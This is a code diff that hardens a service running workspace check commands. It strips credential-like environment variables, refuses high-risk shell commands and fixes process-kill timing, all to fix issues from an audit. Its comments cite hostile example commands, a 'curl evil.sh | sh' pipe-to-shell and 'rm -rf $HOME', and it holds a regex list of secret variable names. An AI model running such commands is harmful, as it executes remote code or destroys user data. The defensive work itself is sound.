@@ -3,6 +3,7 @@ import { randomUUID } from "node:crypto";
 import type { ArgmaxDatabase } from "../persistence/database.js";
 import type { CheckRun } from "../../shared/types.js";
 import { scheduleSigkillEscalation } from "../processControl.js";
+import { classifyCommandRisk } from "../approvals/dangerousActionPolicy.js";
 
 export interface RunWorkspaceCheckInput {
   workspaceId: string;
@@ -21,6 +22,38 @@ export interface RunWorkspaceCheckInput {
 }
 
 const DEFAULT_TIMEOUT_MS = 5 * 60 * 1000;
+
+/**
+ * Environment-variable names that look like credentials. Stripped from the
+ * child env before spawning a check command (audit-2026-05-17 C1/M6).
+ *
+ * Why: check commands run with `shell: true` and were inheriting the full
+ * Electron-main env, which on a developer machine often includes
+ * ANTHROPIC_API_KEY, GITHUB_TOKEN, AWS_*, etc. A typo'd or malicious check
+ * command (e.g. `curl evil.sh | sh`) could exfiltrate those silently. We
+ * default-deny by pattern, not allowlist, because check commands legitimately
+ * need access to user dev env (PYTHONPATH, GOPATH, npm_config_*, etc.) that
+ * would be hard to enumerate up front.
+ */
+const SENSITIVE_ENV_PATTERNS: RegExp[] = [
+  /(^|_)(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIALS?|APIKEY)$/i,
+  /^AWS_/i,
+  /^AZURE_/i,
+  /^GOOGLE_/i,
+  /^GCP_/i,
+  /^OPENAI_/i,
+  /^ANTHROPIC_/i,
+  /^DATABASE_URL$/i
+];
+
+function filterSensitiveEnv(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
+  const out: NodeJS.ProcessEnv = {};
+  for (const [key, value] of Object.entries(env)) {
+    if (SENSITIVE_ENV_PATTERNS.some((pattern) => pattern.test(key))) continue;
+    out[key] = value;
+  }
+  return out;
+}
 /**
  * Cap on accumulated stdout+stderr text. summarizeOutput only persists the
  * last 8 lines anyway; without this cap a noisy command (npm install logs,
@@ -40,6 +73,17 @@ export class CheckService {
   constructor(private readonly database: ArgmaxDatabase) {}
 
   async runWorkspaceCheck(input: RunWorkspaceCheckInput): Promise<CheckRun> {
+    // Reject obviously-destructive shell shapes BEFORE persisting a check row
+    // or spawning. `shell: true` below means the entire `command` string is
+    // interpreted by /bin/sh; without this gate, a check command like
+    // `rm -rf $HOME` or `curl evil.sh | sh` runs unconditionally. We only
+    // reject `high` risk — `medium` (npm install, git commit, git push) is
+    // legitimate in CI scripts.  (audit-2026-05-17 C1/C2)
+    const risk = classifyCommandRisk(input.command);
+    if (risk.riskLevel === "high") {
+      throw new Error(`Check command refused: ${risk.reason}`);
+    }
+
     const workspace = this.database.getWorkspace(input.workspaceId);
     const check = this.database.persistCheck({
       id: randomUUID(),
@@ -62,7 +106,7 @@ export class CheckService {
       const child = spawn(input.command, {
         cwd: workspace.path,
         shell: true,
-        env: process.env,
+        env: filterSensitiveEnv(process.env),
         detached: true
       });
 
@@ -186,10 +230,15 @@ export class CheckService {
     for (const child of children) {
       if (typeof child.pid !== "number") continue;
       const pid = child.pid;
-      scheduleSigkillEscalation(
+      // Attach the cancel handle to the child's exit so the 2s SIGKILL timer
+      // doesn't fire against a (possibly recycled) pgid after the child has
+      // already gone. runWorkspaceCheck's own exit handler still resolves the
+      // run promise — both listeners fire independently.
+      const { cancel } = scheduleSigkillEscalation(
         () => process.kill(-pid, "SIGTERM"),
         () => process.kill(-pid, "SIGKILL")
       );
+      child.once("exit", cancel);
     }
   }
 
